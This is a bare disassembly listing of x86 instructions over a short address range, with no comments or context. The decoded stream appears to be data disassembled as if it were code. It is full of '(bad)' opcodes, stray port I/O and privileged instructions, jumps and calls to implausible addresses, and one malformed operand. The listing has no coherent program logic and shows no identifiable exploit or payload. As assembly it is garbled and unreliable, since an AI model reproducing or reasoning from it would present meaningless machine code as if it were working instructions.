  41d4fb:	add    BYTE PTR [esi],cl
  41d4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4fe:	pop    esp
  41d4ff:	arpl   WORD PTR [edx-0x57],dx
  41d502:	shl    ecx,0xe
  41d505:	inc    ebp
  41d506:	je     0x41d515
  41d508:	or     eax,0xfc311345
  41d50d:	push   es
  41d50e:	add    BYTE PTR [ecx],bl
  41d510:	dec    ecx
  41d511:	cdq    
  41d512:	std    
  41d513:	scas   al,BYTE PTR es:[edi]
  41d514:	push   esi
  41d515:	jl     0x41d4d7
  41d517:	sbb    al,0xd7
  41d519:	inc    ebx
  41d51a:	je     0x41d4e1
  41d51c:	rol    BYTE PTR [ebx+0x13],cl
  41d51f:	xor    DWORD PTR [esi+eax*1-0x33b69c00],edi
  41d526:	add    BYTE PTR [edx-0x1a3e3fb2],bh
  41d52c:	push   cs
  41d52d:	mov    bl,0x88
  41d52f:	test   DWORD PTR [edx+0x5f1a2c53],edx
  41d535:	psubusw mm7,QWORD PTR [esi-0x5e1c2ceb]
  41d53c:	pop    ds
  41d53d:	add    BYTE PTR [eax],al
  41d53f:	jmp    0x423e804a
  41d544:	xor    eax,0x87e900a2
  41d549:	(bad)  
  41d54a:	(bad)  
  41d54b:	call   0x629280ce
  41d550:	iret   
  41d551:	scas   eax,DWORD PTR es:[edi]
  41d552:	cld    
  41d553:	aam    0x1a
  41d555:	in     al,dx
  41d556:	aas    
  41d557:	jmp    0xe3399835
  41d55c:	retf   
  41d55d:	rcl    BYTE PTR [edx+edi*4],cl
	...
  41d57c:	add    BYTE PTR [eax],al
  41d57e:	jg     0x41d52f
  41d580:	mov    BYTE PTR [edi],ah
  41d582:	jns    0x41d5c7
  41d584:	adc    eax,DWORD PTR [eax]
  41d586:	or     BYTE PTR [edi+0x3d],0x0
  41d58a:	mov    ebp,0xf73bf540
  41d58f:	dec    edx
  41d590:	and    DWORD PTR [edi-0xfffdcc],0x40128a19
  41d59a:	and    al,0xb9
  41d59c:	jo     0x41d596
  41d59e:	ins    DWORD PTR es:[edi],dx
  41d59f:	inc    eax
  41d5a0:	icebp  
  41d5a1:	call   0x3c8ef8
  41d5a6:	push   0x69840ac1
  41d5ab:	add    DWORD PTR [eax],eax
  41d5ad:	add    BYTE PTR [edi+0x40],ch
  41d5b0:	add    eax,0x38442989
  41d5b5:	ret    
  41d5b6:	stc    
  41d5b7:	dec    ebp
  41d5b8:	mov    al,BYTE PTR [ebp-0x68]
  41d5bb:	les    eax,FWORD PTR [eax+0x8]
  41d5be:	das    
  41d5bf:	mov    cl,0xb7
  41d5c1:	xchg   edi,eax
  41d5c2:	mov    ah,0x1
  41d5c4:	add    al,ch
  41d5c6:	or     eax,0x1b00009e
  41d5cb:	lea    edx,[eax-0x1]
  41d5ce:	test   eax,0xe815fc49
  41d5d3:	dec    esi
  41d5d4:	cmp    eax,0x36b11f00
  41d5d9:	repz mov ecx,0xc7575055
  41d5df:	mov    ss,WORD PTR [eax-0x1]
	...
  41d5fe:	add    BYTE PTR [eax],al
  41d600:	pop    ecx
  41d601:	dec    ecx
  41d602:	cld    
  41d603:	adc    eax,0x3d50b0
  41d608:	push   DWORD PTR [eax-0x10570cca]
  41d60e:	cli    
  41d60f:	adc    eax,0x3d4c74
  41d614:	xchg   esp,eax
  41d615:	mov    edx,0x41595410
  41d61a:	std    
  41d61b:	push   ebp
  41d61c:	or     eax,0x43d95987
  41d621:	test   BYTE PTR [ecx-0x7c],0x4d
  41d625:	(bad)  
  41d626:	not    BYTE PTR [ebp+0x32]
  41d629:	sub    al,0xe9
  41d62b:	adc    cl,ch
  41d62d:	push   esi
  41d62e:	jns    0x41d68b
  41d630:	and    bl,ah
  41d632:	inc    eax
  41d633:	je     0x41d646
  41d635:	xchg   ebp,eax
  41d636:	mov    ebp,0x470d0cfc
  41d63b:	adc    ebp,DWORD PTR [ecx]
  41d63d:	inc    esp
  41d63e:	sar    edi,0x3a
  41d641:	adc    al,0x47
  41d643:	jae    0x41d64d
  41d645:	add    BYTE PTR [ebp+0x484f79f3],ah
  41d64b:	jae    0x41d62e
  41d64d:	ds push ecx
  41d64f:	(bad)  
  41d650:	loop   0x41d5e7
  41d652:	inc    edi
  41d653:	jae    0x41d62a
  41d655:	popf   
  41d656:	in     eax,dx
  41d657:	dec    edi
  41d658:	clc    
  41d659:	push   ss
  41d65a:	add    al,0x8a
  41d65c:	push   eax
  41d65d:	outs   dx,BYTE PTR ds:[esi]
  41d65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65f:	pop    ebp
  41d660:	data16 mov al,ds:0x446
	...
  41d682:	or     eax,0x8cec7ae4
  41d687:	jb     0x41d615
  41d689:	add    ecx,DWORD PTR ds:0x3754af57
  41d68f:	daa    
  41d690:	(bad)  
  41d692:	aas    
  41d693:	ror    BYTE PTR [ebx-0x3],cl
  41d696:	clc    
  41d697:	xchg   bh,ch
  41d699:	aas    
  41d69a:	or     eax,0x8d0c3fda
  41d69f:	xor    edi,ecx
  41d6a1:	inc    DWORD PTR [ecx]
  41d6a3:	inc    ebx
  41d6a4:	test   BYTE PTR [ebx+0x1],bh
  41d6a7:	push   edi
  41d6a8:	int    0x24
  41d6aa:	nop
  41d6ab:	or     eax,0x8b6220d0
  41d6b0:	cmc    
  41d6b1:	mov    BYTE PTR [edx-0x1],dl
  41d6b4:	push   cs
  41d6b5:	xor    BYTE PTR [eax-0x31851902],cl
  41d6bb:	inc    ebx
  41d6bc:	ins    BYTE PTR es:[edi],dx
  41d6bd:	inc    esp
  41d6be:	ret    
  41d6bf:	icebp  
  41d6c0:	mov    ch,0x48
  41d6c2:	mov    esi,0x142c0ef3
  41d6c7:	jmp    esi
  41d6c9:	jl     0x41d6e8
  41d6cb:	jbe    0x41d741
  41d6cd:	test   DWORD PTR [edi-0x22448bb3],0xd8ad03f
  41d6d7:	add    bh,ah
  41d6d9:	clc    
  41d6da:	sar    BYTE PTR [ebp-0xd814422],0x1e
  41d6e1:	iret   
  41d6e2:	jmp    0x13a035c
	...
  41d703:	add    BYTE PTR [edx-0x28],al
  41d706:	scas   eax,DWORD PTR es:[edi]
  41d707:	add    ecx,DWORD PTR ds:0x97fac200
  41d70d:	mov    ebp,0x3672b3da
  41d712:	out    0x3,eax
  41d714:	or     eax,0xc9b6d858
  41d719:	inc    ebx
  41d71a:	bound  edx,QWORD PTR [ebx-0x72]
  41d71d:	dec    edx
  41d71e:	adc    esi,DWORD PTR [esp+eax*4]
  41d721:	mov    ebp,0x7eaab1f2
  41d726:	data16 add cl,BYTE PTR ds:0x8e482c79
  41d72d:	inc    eax
  41d72e:	out    dx,al
  41d72f:	sti    
  41d730:	inc    eax
  41d731:	pop    eax
  41d732:	add    ch,ch
  41d734:	xchg   ebx,eax
  41d735:	inc    ebx
  41d736:	push   edx
  41d737:	mov    edx,DWORD PTR [esi-0x7fb2607b]
  41d73d:	inc    ebx
  41d73e:	aas    
  41d73f:	sub    edx,DWORD PTR [ebx+0x72dde701]
  41d745:	je     0x41d7ab
  41d747:	bound  ebp,QWORD PTR [ebx+0x43]
  41d74a:	add    BYTE PTR [esi],dh
  41d74c:	sahf   
  41d74d:	js     0x41d792
  41d74f:	(bad)  
  41d751:	mov    esi,0x581472fb
  41d756:	xchg   edi,eax
  41d757:	mov    dl,0xe
  41d759:	add    BYTE PTR [ecx-0x43938ef],cl
  41d75f:	(bad)
  41d763:	imul   ecx,DWORD PTR [ebx-0x5],0x71ff
	...
  41d786:	or     eax,0xa7d54079
  41d78b:	add    BYTE PTR [eax+ebx*8-0x3b],dh
  41d78f:	or     al,0xe8
  41d791:	ret    0x4227
  41d794:	std    
  41d795:	imul   ebp,DWORD PTR ss:[edi],0x810ee81a
  41d79c:	arpl   bp,cx
  41d79e:	adc    eax,ebx
  41d7a0:	scas   eax,DWORD PTR es:[edi]
  41d7a1:	in     al,dx
  41d7a2:	push   cs
  41d7a3:	add    BYTE PTR [ebx-0x2b7569c],cl
  41d7a9:	mov    dh,0xc7
  41d7ab:	inc    edx
  41d7ac:	dec    ebp
  41d7ad:	scas   al,BYTE PTR es:[edi]
  41d7ae:	fdiv   QWORD PTR [edx+0x79092915]
  41d7b4:	inc    ebx
  41d7b5:	in     eax,dx
  41d7b6:	(bad)  
  41d7b7:	cmp    ecx,DWORD PTR [ecx+edi*1]
  41d7ba:	jae    0x41d794
  41d7bc:	add    DWORD PTR [eax-0x32],esp
  41d7bf:	cli    
  41d7c0:	mov    al,BYTE PTR [edx]
  41d7c2:	or     eax,0xa2fa86a8
  41d7c7:	pop    edx
  41d7c8:	fld    TBYTE PTR [esi]
  41d7ca:	or     BYTE PTR [eax],al
  41d7cc:	mov    DWORD PTR [eax*2+0x4f305da5],esp
  41d7d3:	clc    
  41d7d4:	call   FWORD PTR [ebp+0x5b]
  41d7d7:	mul    bh
  41d7d9:	jp     0x41d852
  41d7db:	inc    ecx
  41d7dc:	std    
  41d7dd:	ret    
  41d7de:	jle    0x41d7b8
  41d7e0:	(bad)  
  41d7e1:	call   DWORD PTR [edx+0x425010b9]
  41d7e7:	ds std 
  41d7e9:	add    BYTE PTR [eax],0x0
	...
  41d808:	xor    BYTE PTR [eax-0x40],cl
  41d80b:	push   esi
  41d80c:	out    dx,eax
  41d80d:	das    
  41d80e:	and    DWORD PTR [eax],ecx
  41d810:	fisttp WORD PTR [ecx+0x3e728d39]
  41d816:	dec    ebp
  41d817:	mov    dh,BYTE PTR [edx-0xa]
  41d81a:	push   ebp
  41d81b:	call   0x41d6a6
  41d820:	xchg   edx,eax
  41d821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d822:	sbb    dh,BYTE PTR fs:0x7ac02efe
  41d829:	rol    BYTE PTR [ebx],0x0
  41d82c:	add    ebp,0xc6d551eb
  41d832:	add    eax,0xfd7d748b
  41d837:	push   esp
  41d839:	mov    ss,WORD PTR [edi+edi*8+0x61]
  41d83d:	inc    esp
  41d83e:	mov    bl,BYTE PTR [ebp-0x34]
  41d841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d842:	pop    edx
  41d843:	xor    ebp,DWORD PTR [ebx+0x20c083ba]
  41d849:	out    dx,al
  41d84a:	cli    
  41d84b:	jne    0x41d7f5
  41d84d:	mov    ch,0xff
  41d850:	icebp  
  41d851:	mov    bl,0xfa
  41d853:	jne    0x41d80d
  41d855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d856:	int    0x0
  41d858:	mov    ah,0xfd
  41d85a:	cli    
  41d85b:	jne    0x41d7f9
  41d85d:	(bad)  
  41d85e:	imul   eax
  41d860:	fist   WORD PTR [edi-0x2]
  41d863:	call   FWORD PTR [edi]
  41d865:	inc    ebx
  41d866:	mov    BYTE PTR [ebp-0x54],cl
  41d869:	(bad)  
  41d86a:	jg     0x41d7ec
	...
  41d888:	add    BYTE PTR [eax],al
  41d88a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d88b:	std    
  41d88c:	call   DWORD PTR [esi+0x3c]
  41d88f:	xlat   BYTE PTR ds:[ebx]
  41d890:	cs (bad) 
  41d892:	jmp    0x41d881
  41d894:	mov    edi,0xf5aa0d85
  41d899:	pushf  
  41d89a:	dec    ebp
  41d89b:	xchg   edx,eax
  41d89c:	stos   BYTE PTR es:[edi],al
  41d89d:	(bad)  
  41d89e:	dec    edi
  41d89f:	dec    edi
  41d8a0:	add    DWORD PTR [ebx-0x6a],edx
  41d8a3:	mov    bl,0x81
  41d8a5:	in     al,dx
  41d8a6:	sbb    eax,0xad87a66
  41d8ab:	leave  
  41d8ac:	inc    ecx
  41d8ad:	dec    eax
  41d8ae:	mov    ebx,0xc1ef7a81
  41d8b3:	dec    edi
  41d8b4:	mov    ecx,0xc0111772
  41d8b9:	sti    
  41d8ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8bb:	std    
  41d8bc:	cld    
  41d8bd:	(bad)
  41d8c0:	fsubr  DWORD PTR [ecx+0xd]
  41d8c3:	inc    edx
  41d8c4:	int    0xfb
  41d8c6:	nop
  41d8c7:	xchg   esp,eax
  41d8c8:	xor    DWORD PTR [edx+0xd],ebp
  41d8cb:	jmp    FWORD PTR ds:0x78570c20
  41d8d1:	push   es
  41d8d2:	xchg   esi,eax
  41d8d3:	(bad)  
  41d8d4:	cmp    edi,0x2
  41d8d7:	push   edi
  41d8d8:	jbe    0x41d925
  41d8da:	fld    QWORD PTR [edi]
  41d8dc:	inc    ebx
  41d8dd:	jae    0x41d8e0
  41d8df:	cmp    cl,ch
  41d8e1:	pop    es
  41d8e2:	cmc    
  41d8e3:	inc    eax
  41d8e4:	paddw  mm4,mm2
  41d8e7:	fisttp QWORD PTR [ebx-0x7d]
  41d8ea:	fimul  DWORD PTR [edx]
  41d8ec:	in     eax,dx
  41d8ed:	push   eax
	...
  41d90a:	add    BYTE PTR [eax],al
  41d90c:	cmp    ch,BYTE PTR [edi-0x55]
  41d90f:	cld    
  41d910:	retf   0x7a61
  41d913:	fcom   DWORD PTR [esi-0x780128af]
  41d919:	popa   
  41d91a:	inc    ebx
  41d91b:	adc    BYTE PTR [edi-0x69c1a86b],al
  41d921:	pop    eax
  41d922:	js     0x41d8a4
  41d924:	lea    edx,[edi+0x1]
  41d927:	add    BYTE PTR [eax-0x7fb1081d],cl
  41d92d:	push   DWORD PTR [ebx-0x2bbf2405]
  41d933:	sti    
  41d934:	shl    BYTE PTR [ebp+0x2a],cl
  41d937:	pop    esp
  41d938:	lea    ecx,[edi]
  41d93a:	dec    esi
  41d93b:	inc    ebp
  41d93c:	mov    DWORD PTR [edi],edi
  41d93e:	mov    ebx,0xeaca69e6
  41d943:	js     0x41d990
  41d945:	inc    eax
  41d946:	mov    esp,0xcf57bdfb
  41d94b:	add    ecx,DWORD PTR ds:0x12cf2600
  41d951:	jnp    0x41d97a
  41d953:	cmc    
  41d954:	mov    eax,ds:0x23d1ff3c
  41d959:	jmp    esi
  41d95b:	pop    eax
  41d95c:	dec    ebp
  41d95d:	or     eax,0xa4c8a527
  41d962:	das    
  41d963:	inc    edx
  41d964:	adc    eax,0x29789c00
  41d969:	jl     0x41d96e
  41d96b:	dec    esp
  41d96c:	mov    WORD PTR [ebx+0x3],ss
  41d96f:	mov    cl,0x0
	...
  41d98d:	add    BYTE PTR [eax-0x29],ah
  41d990:	(bad)  
  41d992:	push   ss
  41d993:	mov    edx,edi
  41d995:	js     0x41d9e5
  41d997:	adc    BYTE PTR [ecx+0x4],al
  41d99a:	xchg   ah,bl
  41d99c:	or     ah,BYTE PTR [esi*8-0x1fbb4367]
  41d9a3:	mov    DWORD PTR [ebx],ebp
  41d9a5:	and    BYTE PTR [ecx],cl
  41d9a7:	test   DWORD PTR [edi-0x507cf532],esp
  41d9ad:	inc    esp
  41d9ae:	mov    dl,0x5b
  41d9b0:	out    0x3,eax
  41d9b2:	or     eax,0xfc1c158d
  41d9b7:	pop    edx
  41d9b8:	ss jl  0x41da0c
  41d9bb:	in     al,0xda
  41d9bd:	inc    esp
  41d9be:	(bad)  
  41d9bf:	pop    ss
  41d9c0:	fld    st(3)
  41d9c2:	mov    ds:0x5b3f000e,al
  41d9c7:	pop    es
  41d9c8:	dec    eax
  41d9c9:	cmc    
  41d9ca:	sti    
  41d9cb:	(bad)  
  41d9cc:	jb     0x41d9a4
  41d9ce:	lea    eax,[esi+0x18]
  41d9d1:	jb     0x41d953
  41d9d3:	clc    
  41d9d4:	inc    ebx
  41d9d5:	or     eax,0x4e63b069
  41d9da:	inc    ebx
  41d9db:	or     ecx,DWORD PTR [ecx-0x3958a154]
  41d9e1:	jmp    0x2b29d9f4
  41d9e6:	xchg   edi,eax
  41d9e7:	cmp    al,0xfd
  41d9e9:	gs into 
  41d9eb:	mov    bl,0x4f
  41d9ed:	loopne 0x41da1f
  41d9ef:	or     al,0x93
  41d9f1:	sub    DWORD PTR [eax],eax
	...
  41da0f:	add    dh,al
  41da11:	ret    
  41da12:	and    edi,ecx
  41da14:	aad    0xeb
  41da16:	and    BYTE PTR [edi],0x36
  41da19:	mov    BYTE PTR [esi],al
  41da1b:	ret    0xe36a
  41da1e:	pop    ss
  41da1f:	jp     0x41da35
  41da21:	cmp    eax,0x2722cd74
  41da26:	dec    esi
  41da27:	pushf  
  41da28:	leave  
  41da29:	cmp    al,0x84
  41da2b:	test   eax,0x54fce9c5
  41da30:	sbb    eax,0xa6f94389
  41da35:	dec    eax
  41da36:	add    cl,ch
  41da38:	push   cs
  41da39:	sub    BYTE PTR [eax+esi*1-0x567bc2b2],cl
  41da40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da41:	adc    eax,0x3d4f01e8
  41da46:	std    
  41da47:	inc    ebx
  41da48:	stc    
  41da49:	mov    al,BYTE PTR [ebp+ecx*8+0x2a]
  41da4d:	rcl    BYTE PTR [ebp-0x62],1
  41da50:	and    al,0xcc
  41da52:	adc    eax,0xd8f11129
  41da57:	push   0x45
  41da59:	or     al,0x41
  41da5b:	add    BYTE PTR [ebx],cl
  41da5d:	ret    
  41da5e:	adc    BYTE PTR [esi+eax*8],bl
  41da61:	inc    edx
  41da62:	std    
  41da63:	imul   esp,DWORD PTR [edx+ebp*8-0x3cdccb24],0x1818647e
  41da6e:	add    BYTE PTR [ebx+0x157104ef],al
	...
  41da90:	add    BYTE PTR [eax],al
  41da92:	in     al,0x40
  41da94:	add    eax,0xfb1a5902
  41da99:	je     0x41dab3
  41da9b:	adc    al,0xfb
  41da9d:	je     0x41daa7
  41da9f:	adc    al,0xe8
  41daa1:	ror    DWORD PTR [ecx+eax*8-0x6],1
  41daa5:	jmp    0x41db14
  41daa7:	(bad)  
  41daa8:	je     0x41dace
  41daaa:	or     al,0xec
  41daac:	(bad)  
  41daae:	and    eax,ebx
  41dab0:	xchg   BYTE PTR [eax+ecx*2+0xe],dh
  41dab4:	sti    
  41dab5:	ss or  al,0x72
  41dab8:	adc    eax,0xe5583401
  41dabd:	push   0x8d00032c
  41dac2:	cwde   
  41dac3:	es adc eax,ebp
  41dac6:	adc    BYTE PTR [ecx-0x4],cl
  41dac9:	(bad)  
  41daca:	jg     0x41da92
  41dacc:	pop    edx
  41dacd:	pop    esi
  41dace:	dec    edi
  41dacf:	(bad)  
  41dad0:	loope  0x41db2f
  41dad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dad3:	or     eax,0x8d3b5600
  41dad8:	clc    
  41dad9:	lea    ebp,[ebx]
  41dadb:	or     al,0xe8
  41dadd:	lods   eax,DWORD PTR ds:[esi]
  41dade:	mov    eax,ds:0x1b8dfac2
  41dae3:	sbb    al,0xe8
  41dae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dae6:	mov    eax,ds:0xfb8dfac2
  41daeb:	sub    ecx,DWORD PTR [ebp-0x1]
  41daee:	mov    ecx,0xd401215
  41daf3:	daa    
  41daf4:	mov    ?,WORD PTR [ebp+0x0]
	...
  41db13:	add    BYTE PTR [ecx],cl
  41db15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db16:	inc    ecx
  41db17:	je     0x41db2b
  41db19:	push   ds
  41db1a:	inc    ecx
  41db1b:	adc    ecx,DWORD PTR [ecx]
  41db1d:	pop    edx
  41db1e:	sar    edi,0x3b
  41db21:	adc    eax,0x1f5b0d45
  41db26:	int3   
  41db27:	jae    0x41db3e
  41db29:	jo     0x41dae3
  41db2b:	or     edx,DWORD PTR [eax+0xee91971]
  41db31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db32:	retf   0x8807
  41db35:	loopne 0x41daee
  41db37:	add    ebx,DWORD PTR [edi]
  41db39:	out    0x2d,eax
  41db3b:	inc    ebx
  41db3c:	xchg   esi,eax
  41db3d:	cwde   
  41db3e:	add    eax,0xe57b8656
  41db43:	pop    es
  41db44:	test   BYTE PTR [ebp+0x12],dl
  41db47:	mov    ch,0xbd
  41db49:	sub    DWORD PTR [edx],edx
  41db4b:	mov    ch,0xcd
  41db4d:	daa    
  41db4e:	mov    cs,WORD PTR [edi+0x9]
  41db51:	es jb  0x41db1a
  41db54:	mov    cl,bh
  41db56:	mov    ah,0x20
  41db58:	xchg   esi,eax
  41db59:	jo     0x41db64
  41db5b:	cmp    DWORD PTR [esi+esi*4+0x1c],ecx
  41db5f:	sub    DWORD PTR [ebp+0x72],eax
  41db62:	dec    edi
  41db63:	or     eax,0xd837cf
  41db68:	(bad)  
  41db6a:	ds je  0x41db96
  41db6d:	xor    ecx,DWORD PTR [edx-0x32c405cb]
  41db73:	adc    eax,0xc484274d
	...
  41db94:	add    BYTE PTR [eax],al
  41db96:	sbb    DWORD PTR [edx+0x3],edx
  41db99:	sub    DWORD PTR [edx],0x38ff7127
  41db9f:	imul   ecx,DWORD PTR [eax+eax*1],0x4f2fa238
  41dba6:	pop    esp
  41dba7:	add    dh,dh
  41dba9:	jns    0x41dbf5
  41dbab:	add    DWORD PTR [edx+0x2b],ebp
  41dbae:	and    eax,0x4a141ad6
  41dbb3:	(bad)  
  41dbb4:	adc    cl,BYTE PTR [ecx]
  41dbb6:	fistp  QWORD PTR [edi]
  41dbb8:	nop
  41dbb9:	imul   ecx,DWORD PTR ds:0x1d8ee700,0x86058218
  41dbc3:	scas   eax,DWORD PTR es:[edi]
  41dbc4:	fimul  WORD PTR [ebp+edx*1+0xd3bcc81]
  41dbcb:	shl    DWORD PTR [ebp-0x17703d74],1
  41dbd1:	add    ecx,DWORD PTR ds:0xbdebaf8b
  41dbd7:	cmp    al,0xdc
  41dbd9:	sbb    edi,edi
  41dbdb:	mov    edi,0xbd38ce6
  41dbe0:	ins    BYTE PTR es:[edi],dx
  41dbe1:	inc    esp
  41dbe2:	fst    DWORD PTR [ecx]
  41dbe4:	cs mov edx,0x2c0ed012
  41dbea:	sbb    bh,bh
  41dbec:	out    0x8a,al
  41dbee:	into   
  41dbef:	aaa    
  41dbf0:	(bad)  
  41dbf1:	retf   0x870a
  41dbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf5:	aas    
  41dbf6:	mov    esp,0x1fdc3c
	...
  41dc17:	add    bh,bh
  41dc19:	mov    edi,0x379684e6
  41dc1e:	out    0x8c,eax
  41dc20:	mov    BYTE PTR [edi],0x96
  41dc23:	mov    ds,WORD PTR [esi+0x3c]
  41dc26:	pop    esp
  41dc27:	pop    ss
  41dc28:	mov    WORD PTR [ebp-0xf9afc26],fs
  41dc2e:	pop    ebx
  41dc2f:	add    al,0xd
  41dc31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc32:	loop   0x41dc0f
  41dc34:	repnz inc edx
  41dc36:	stos   DWORD PTR es:[edi],eax
  41dc37:	add    ecx,DWORD PTR ds:0x4c2ca6ee
  41dc3d:	jp     0x41dc3f
  41dc3f:	stc    
  41dc40:	fwait
  41dc41:	cmp    edi,ebp
  41dc43:	pop    ss
  41dc44:	jnp    0x41dc45
  41dc46:	push   edi
  41dc47:	(bad)  [ecx+0x28]
  41dc4a:	mov    dl,0xa5
  41dc4c:	push   cs
  41dc4d:	add    BYTE PTR [ecx+ebp*4+0x2488de7a],al
  41dc54:	dec    ebp
  41dc55:	mov    DWORD PTR [ebx-0x7f],edx
  41dc58:	xchg   ecx,eax
  41dc59:	mov    DWORD PTR [edi],0x9e23b716
  41dc5f:	lods   eax,DWORD PTR ds:[esi]
  41dc60:	push   cs
  41dc61:	add    BYTE PTR [ecx+ebp*4-0x4b76f53e],al
  41dc68:	push   ss
  41dc69:	aad    0x69
  41dc6b:	in     eax,0x56
  41dc6d:	xchg   BYTE PTR [ebx-0x1f],dl
  41dc70:	es jns 0x41dc34
  41dc73:	jmp    0x471a6286
  41dc78:	fwait
  41dc79:	xor    ebp,eax
  41dc7b:	out    0x0,al
	...
  41dc99:	add    ch,dh
  41dc9b:	cmp    bh,ch
  41dc9d:	arpl   cx,cx
  41dc9f:	fcomp  QWORD PTR [eax-0x71]
  41dca2:	xlat   BYTE PTR ds:[ebx]
  41dca3:	cmp    eax,0xca5fe904
  41dca8:	push   edx
  41dca9:	jb     0x41dd15
  41dcab:	fist   WORD PTR [edi]
  41dcad:	mov    edi,0x5cf88855
  41dcb2:	gs jecxz 0x41dd0a
  41dcb5:	jo     0x41dd11
  41dcb7:	fisttp WORD PTR [edi]
  41dcb9:	inc    BYTE PTR [eax]
  41dcbb:	sbb    BYTE PTR [edx],dl
  41dcbd:	test   eax,0xe543890e
  41dcc2:	or     esp,eax
  41dcc4:	pop    es
  41dcc5:	pop    edi
  41dcc6:	pop    es
  41dcc7:	inc    ebp
  41dcc8:	inc    esp
  41dcc9:	add    eax,0x5e8c39f1
  41dcce:	add    eax,0x983a0689
  41dcd3:	mov    bl,0x23
  41dcd5:	add    al,al
  41dcd7:	xchg   eax,eax
  41dcd9:	je     0x41dd03
  41dcdb:	data16 std 
  41dcdd:	dec    edi
  41dcde:	fwait
  41dcdf:	sbb    BYTE PTR [ebx+edx*1],bl
  41dce2:	hlt    
  41dce3:	add    edi,DWORD PTR [ecx]
  41dce5:	add    dh,BYTE PTR [ebp-0x2a8b0002]
  41dceb:	xor    al,bl
  41dced:	call   DWORD PTR [eax]
  41dcef:	sub    BYTE PTR ds:0x121aa1ff,cl
  41dcf5:	inc    eax
  41dcf6:	mov    ah,0x88
  41dcf8:	mov    edi,0x5a59fb5b
  41dcfd:	pop    ecx
	...
  41dd1a:	add    BYTE PTR [eax],al
  41dd1c:	std    
  41dd1d:	mov    ebp,0x48ef000f
  41dd22:	std    
  41dd23:	cmp    dh,BYTE PTR [ebx+0x32077616]
  41dd29:	dec    eax
  41dd2a:	and    DWORD PTR [eax],esp
  41dd2c:	in     ax,0xbb
  41dd2f:	push   esi
  41dd30:	fistp  DWORD PTR [eax]
  41dd32:	sbb    al,0x12
  41dd34:	mov    ah,0xfe
  41dd36:	xor    eax,eax
  41dd38:	mov    edi,0x1b36fad9
  41dd3d:	sbb    DWORD PTR [ebx+edx*1],eax
  41dd40:	je     0x41dd40
  41dd42:	jle    0x41dd6a
  41dd44:	xor    al,0x66
  41dd46:	mov    ebp,0xe7fe2400
  41dd4b:	push   esp
  41dd4c:	xor    al,BYTE PTR [ebx]
  41dd4e:	add    BYTE PTR [ebx+0x74f68904],cl
  41dd54:	loopne 0x41dcdc
  41dd56:	sbb    DWORD PTR [edx+eax*2+0x3e],ecx
  41dd5a:	std    
  41dd5b:	imul   ebx,DWORD PTR [ecx+edi*8+0x73],0xfc53d424
  41dd63:	sar    DWORD PTR [esi+0x41],cl
  41dd66:	and    DWORD PTR [eax],esi
  41dd68:	pop    esp
  41dd69:	test   BYTE PTR [eax],al
  41dd6b:	add    BYTE PTR ds:0x297e8c27,cl
  41dd71:	fdivr  QWORD PTR [edx-0x29d888c1]
  41dd77:	xchg   DWORD PTR [ebx-0x1],edx
  41dd7a:	cmp    al,0x13
  41dd7c:	cmp    eax,0xffc159
	...
  41dd9d:	add    BYTE PTR [edi-0x71c817e5],dl
  41dda3:	imul   ebx,DWORD PTR [ecx],0xffffff83
  41dda6:	les    edx,FWORD PTR [ebx]
  41dda8:	(bad)  
  41dda9:	mov    ss,WORD PTR gs:[esp+ecx*1]
  41ddad:	add    BYTE PTR [ebx],ah
  41ddaf:	sbb    cl,BYTE PTR ds:0xa33048b6
  41ddb5:	mov    BYTE PTR [eax+0x2f],al
  41ddb8:	mov    ds:0xa31fafbe,eax
  41ddbd:	or     BYTE PTR [edi+0x5a],cl
  41ddc0:	jbe    0x41ddaa
  41ddc2:	adc    bl,BYTE PTR [edx-0x65fc17fc]
  41ddc8:	add    DWORD PTR [eax],eax
  41ddca:	test   DWORD PTR [ebx-0x1b],ebp
  41ddcd:	and    edx,DWORD PTR [esi-0x5d6dd718]
  41ddd3:	daa    
  41ddd4:	add    DWORD PTR [eax-0x44],edx
  41ddd7:	xchg   ecx,eax
  41ddd8:	rol    DWORD PTR ds:[edx],1
  41dddb:	mov    ecx,0xa5fd23c4
  41dde0:	inc    esp
  41dde1:	or     al,0xd5
  41dde3:	call   0x7fa9:0x35c14813
  41ddea:	or     eax,0xd6a0127
  41ddef:	jb     0x41de2f
  41ddf1:	adc    edi,DWORD PTR [ebp-0x70003ea8]
  41ddf7:	jecxz  0x41de05
  41ddf9:	jmp    0x6ece6707
  41ddfe:	dec    edi
  41ddff:	sahf   
  41de00:	mov    esp,0x23
	...
  41de1d:	add    BYTE PTR [eax],al
  41de1f:	add    BYTE PTR ds:0xe5457200,dh
  41de25:	xor    eax,0x84f03dbc
  41de2a:	xor    ebp,eax
  41de2c:	dec    ah
  41de2e:	xor    al,0xac
  41de30:	pop    ebp
  41de31:	mov    ds:0x650427,al
  41de36:	out    0xb,eax
  41de38:	or     eax,0xc85e4828
  41de3d:	cmp    BYTE PTR [ebx+0x44],ah
  41de40:	cmp    DWORD PTR [ecx],eax
  41de42:	pop    edx
  41de43:	add    esi,DWORD PTR [edx-0x4fc26201]
  41de49:	sar    DWORD PTR [esi+0x72],1
  41de4c:	(bad)  
  41de4d:	(bad)  
  41de4e:	out    0x80,al
  41de50:	in     al,dx
  41de51:	dec    DWORD PTR [edi+0x7e389b34]
  41de57:	mov    al,BYTE PTR [ebp-0x41]
  41de5a:	cmp    cx,WORD PTR [edx+0x7a83d2ac]
  41de61:	std    
  41de62:	fild   DWORD PTR [esp+edi*1]
  41de65:	inc    edi
  41de66:	lds    ecx,FWORD PTR [edx-0x7c20daf9]
  41de6c:	bound  eax,QWORD PTR [ebx]
  41de6e:	aam    0x0
  41de70:	mov    ebp,ds
  41de72:	out    0x89,al
  41de74:	(bad)
  41de77:	les    edx,FWORD PTR [ebx]
